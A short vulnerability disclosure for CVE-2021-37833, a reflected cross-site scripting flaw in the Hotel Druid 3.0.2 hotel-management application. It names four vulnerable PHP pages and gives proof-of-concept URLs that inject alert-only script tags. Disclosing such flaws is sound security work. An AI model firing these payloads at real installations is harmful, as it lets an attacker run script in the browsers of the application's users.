# CVE 2021-37833 Hotel Druid 3.0.2 Reflected Cross Site Scripting Vulnerability

A reflected Cross Site Scripting vulnerability exists in multiple pages in version 3.0.2 of the Hotel Druid application that allows for arbitrary execution of JavaScript commands.
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37833

Vulnerable PHP Pages:

crea_modelli.php - cambia_frasi parameter
visualizza_tabelle.php - arbitrary URL parameter
tabella.php - arbitrary URL parameter
storia_soldi.php - arbitary URL Parameter

Vulnerable Payloads

/visualizza_tabelle.php?anno=2021&tipo_tabella=prenotazioni&sel_tab_prenota=tutte&wo03b"><script>alert('xss hotel druid')</script>w5px3=1

/storia_soldi.php?piu17"><script>alert('xss hotel druid')</script>e3esq=1

/crea_modelli.php?anno=2021&id_sessione=&fonte_dati_conn=attuali&T_PHPR_DB_TYPE=postgresql&T_PHPR_DB_NAME=%C2%9E%C3%A9e&T_PHPR_DB_HOST=localhost&T_PHPR_DB_PORT=5432&T_PHPR_DB_USER=%C2%9E%C3%A9e&T_PHPR_DB_PASS=%C2%9E%C3%A9e&T_PHPR_LOAD_EXT=NO&T_PHPR_TAB_PRE=%C2%9E%C3%A9e&anno_modello=2021&lingua_modello=en&cambia_frasi=SIipq85%22%3E%3Cscript%3Ealert(%27xss%20hotel%20druid%27)%3C%2fscript%3Ef9xkbujgt24&form_availability_calendar_template=1

/tabella.php?jkuh3"><script>alert('xss hotel druid')</script>yql8b=1

Discovered by Joe Helle, July 2021
